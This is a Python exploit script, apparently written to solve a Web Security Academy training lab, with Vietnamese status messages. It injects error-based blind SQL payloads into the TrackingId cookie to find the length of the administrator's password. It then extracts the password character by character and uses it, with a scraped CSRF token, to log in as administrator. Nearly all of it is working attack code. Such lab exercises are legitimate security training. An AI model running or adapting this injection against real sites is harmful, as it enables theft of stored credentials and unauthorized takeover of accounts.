import requests
import re
from bs4 import BeautifulSoup

host="0a7200fe046c86fd8147ace500ce005d.web-security-academy.net"
path="/filter?category=Pets"
login="/login"

TrackingID_original="9oIRTUk6AtflC9xT"
Session_ID="153FdLB7EwBxlFawTEh1ITfAESZ1BFpB"

s=requests.Session()

def make_request(payload):
    cookies={
        "session":Session_ID,
        "TrackingId":TrackingID_original+payload
    }
    headers={
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br"
    }
    res=requests.get("https://"+host+path,headers=headers,cookies=cookies)
    return res.status_code==500

print("[+] Đang tìm độ dài password...")
for x in range(1,100):
    payload_find_length=f"'||(SELECT CASE WHEN LENGTH(password)<{x} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    if make_request(payload_find_length):
        length_password=x
        print(f"[*] Độ dài password là: {length_password}")
        break

list_character="abcdefghijklmnopqrstuvwxyz0123456789"
password=""
    
if length_password>0:
    print("[+] Đang giải mã password...") 
    for x in range(1,length_password+1):
        for c in list_character:
            payload_find_password=f"'||(SELECT CASE WHEN SUBSTR(password,{x},1)='{c}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"           
            if make_request(payload_find_password):
                password+=c
                print(f"[!] Tìm thấy ký tự thứ {x}: {c} -> Password hiện tại: {password}")
                break
    print("-" * 30)
    print(f"SUCCESS: Password của administrator là: {password}")
else:
    print("[-] Không tìm thấy độ dài password. Kiểm tra lại TrackingId hoặc URL.")
    
res_get = s.get("https://"+host+login)
soup = BeautifulSoup(res_get.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf'})['value']

login_data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}

print(f"[*] Đang đăng nhập...")
res_post = s.post("https://"+host+login, data=login_data, allow_redirects=True)

if "Log out" in res_post.text:
    print("THÀNH CÔNG: Bạn đã đăng nhập vào hệ thống!")
else:
    print("[-] Đăng nhập thất bại.")